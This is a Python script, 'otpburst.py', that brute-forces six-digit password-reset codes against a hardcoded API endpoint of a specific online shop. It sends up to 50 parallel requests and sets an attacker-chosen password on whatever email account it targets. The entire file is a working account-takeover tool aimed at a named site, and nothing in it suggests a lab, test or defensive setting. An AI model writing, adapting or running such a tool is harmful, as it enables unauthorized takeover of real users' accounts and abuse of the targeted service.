"""
otpburst.py — async OTP brute forcer. Stops on first success.
Usage: python3 otpburst.py <email> <new_pass> [--start 0] [--end 999999] [--concurrency 50]
"""
import argparse
import asyncio
import sys
import time

import aiohttp

URL = "https://www.sharkdiecast.com.br/api/index.php"
UA  = "Mozilla/5.0 (compatible; skullFuzz/1.0)"

found  = None
tested = 0
start_time = None


async def try_code(session, sem, email, code, new_pass):
    global found, tested
    if found:
        return
    async with sem:
        if found:
            return
        payload = (
            f"action=reset_password"
            f"&email={email}"
            f"&code={code:06d}"
            f"&pass={new_pass}"
        )
        try:
            async with session.post(
                URL,
                data=payload,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=aiohttp.ClientTimeout(total=8),
                allow_redirects=False,
            ) as r:
                body = await r.text()
                tested += 1
                if tested % 100 == 0:
                    elapsed = time.time() - start_time
                    rate = tested / elapsed
                    eta  = (args.end - args.start - tested) / rate if rate else 0
                    print(
                        f"\r  [{tested:>7}] {rate:>6.0f} req/s  ETA {eta/60:.1f}min  "
                        f"current={code:06d}",
                        end="", flush=True,
                    )
                if '"success":true' in body and "error" not in body.lower():
                    found = code
        except Exception:
            pass


async def run(args):
    global start_time
    start_time = time.time()
    sem  = asyncio.Semaphore(args.concurrency)
    conn = aiohttp.TCPConnector(limit=args.concurrency, ssl=False)

    print(f"  Target : {URL}")
    print(f"  Email  : {args.email}")
    print(f"  Range  : {args.start:06d} → {args.end:06d}  ({args.end - args.start + 1} codes)")
    print(f"  Threads: {args.concurrency}")
    print()

    async with aiohttp.ClientSession(
        connector=conn, headers={"User-Agent": UA}
    ) as session:
        batch = 2000
        for chunk_start in range(args.start, args.end + 1, batch):
            if found is not None:
                break
            tasks = [
                try_code(session, sem, args.email, code, args.new_pass)
                for code in range(chunk_start, min(chunk_start + batch, args.end + 1))
            ]
            await asyncio.gather(*tasks)

    print()
    elapsed = time.time() - start_time
    if found is not None:
        print(f"\n  [SUCCESS] Code: {found:06d}  ({elapsed:.1f}s)")
        print(f"  Password reset to: {args.new_pass}")
        return 0
    else:
        print(f"\n  [NOT FOUND] {tested} codes tested in {elapsed:.1f}s")
        print(f"  OTP may have expired — retrigger forgot_password and run next range")
        return 1


def parse():
    global args
    p = argparse.ArgumentParser(description="Fast async OTP brute forcer.")
    p.add_argument("email",    help="Target email")
    p.add_argument("new_pass", help="New password to set on success")
    p.add_argument("--start",       type=int, default=0,      help="Start code (default 0)")
    p.add_argument("--end",         type=int, default=999999,  help="End code (default 999999)")
    p.add_argument("--concurrency", type=int, default=50,      help="Parallel requests (default 50)")
    args = p.parse_args()
    return args


if __name__ == "__main__":
    args = parse()
    try:
        sys.exit(asyncio.run(run(args)))
    except KeyboardInterrupt:
        print(f"\n  Interrupted. Tested {tested} codes.")
        sys.exit(130)
